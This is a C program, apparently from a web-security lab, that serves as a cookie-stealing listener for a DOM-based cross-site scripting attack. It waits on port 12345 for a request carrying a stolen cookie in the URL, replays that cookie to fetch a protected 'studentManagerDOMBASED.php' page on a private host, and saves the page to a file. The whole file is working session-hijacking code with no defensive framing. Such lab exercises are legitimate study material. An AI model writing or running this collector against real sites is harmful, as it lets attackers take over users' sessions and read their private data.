#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define PORT 12345
#define BUFFER_SIZE 8192
#define WEB_SERVER_IP "192.168.1.203"
#define WEB_SERVER_PORT 80
#define EXIT_ERROR 1

/* Function to extract cookie value from HTTP request */
void extract_cookie(const char *request, char *cookie_out, size_t max_len) {
    const char *cookie_start = strstr(request, "/?");
    if (cookie_start) {
        cookie_start += 2; /* Skip "/?" */
        const char *cookie_end = strstr(cookie_start, " ");
        if (cookie_end) {
            size_t len = (size_t)(cookie_end - cookie_start);
            if (len < max_len) {
                strncpy(cookie_out, cookie_start, len);
                cookie_out[len] = '\0';
            }
        }
    }
}

/* Function to fetch the protected page using stolen cookie */
int fetch_protected_page(const char *cookie, char *response_out, size_t max_len) {
    int sock;
    struct sockaddr_in server_addr;
    char request[BUFFER_SIZE];
    char buffer[BUFFER_SIZE];
    ssize_t total_received = 0;
    ssize_t n;

    /* Create socket */
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }
    // Set the SO_REUSEADDR and SO_REUSEPORT options on the socket
    int opt = 1;
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(sock);
        exit(EXIT_ERROR);
    }
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(sock);
        exit(EXIT_ERROR);
    }

    /* Setup server address */
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(WEB_SERVER_PORT);
    if (inet_pton(AF_INET, WEB_SERVER_IP, &server_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }

    /* Connect to web server */
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }

    /* Construct HTTP GET request with stolen cookie */
    /* Target: studentManagerDOMBASED.php page */
    snprintf(request, sizeof(request),
             "GET /studentManagerDOMBASED.php HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Cookie: %s\r\n"
             "Connection: close\r\n"
             "\r\n",
             WEB_SERVER_IP, cookie);


    /* Send request */
    if (send(sock, request, strlen(request), 0) < 0) {
        close(sock);
        return -1;
    }

    /* Receive response */
    response_out[0] = '\0';
    while ((n = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[n] = '\0';
        if (total_received + n < (ssize_t)max_len - 1) {
            strcat(response_out, buffer);
            total_received += n;
        }
    }

    close(sock);
    return 0;
}

/* Function to save response to file */
void save_to_file(const char *filename, const char *content) {
    FILE *fp = fopen(filename, "w");
    if (fp) {
        fprintf(fp, "%s", content);
        fclose(fp);
    }
}

int main(void) {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len;
    char buffer[BUFFER_SIZE];
    char cookie[BUFFER_SIZE];
    char protected_page[BUFFER_SIZE];
    ssize_t bytes_received;

    /* Create socket */
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        return 1;
    }
    // Set the SO_REUSEADDR and SO_REUSEPORT options on the socket
    int opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(server_fd);
        exit(EXIT_ERROR);
    }
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
        printf("setsockopt(SO_REUSEADDR) failed...\n");
        close(server_fd);
        exit(EXIT_ERROR);
    }

    /* Set socket options */
    opt = 1;
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        close(server_fd);
        return 1;
    }

    /* Setup server address */
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    /* Bind socket */
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(server_fd);
        return 1;
    }

    /* Listen */
    if (listen(server_fd, 1) < 0) {
        close(server_fd);
        return 1;
    }

    /* Accept connection */
    client_len = sizeof(client_addr);
    client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
    if (client_fd < 0) {
        close(server_fd);
        return 1;
    }

    /* Receive HTTP request */
    memset(buffer, 0, sizeof(buffer));
    bytes_received = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';

        /* Send OK response */
        const char *response = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
        send(client_fd, response, strlen(response), 0);

        /* Extract cookie */
        memset(cookie, 0, sizeof(cookie));
        extract_cookie(buffer, cookie, sizeof(cookie));

        /* Fetch protected page */
        memset(protected_page, 0, sizeof(protected_page));
        if (fetch_protected_page(cookie, protected_page, sizeof(protected_page)) == 0) {
            save_to_file("spoofed-dom.txt", protected_page);
        }
    }

    close(client_fd);
    close(server_fd);

    return 0;
}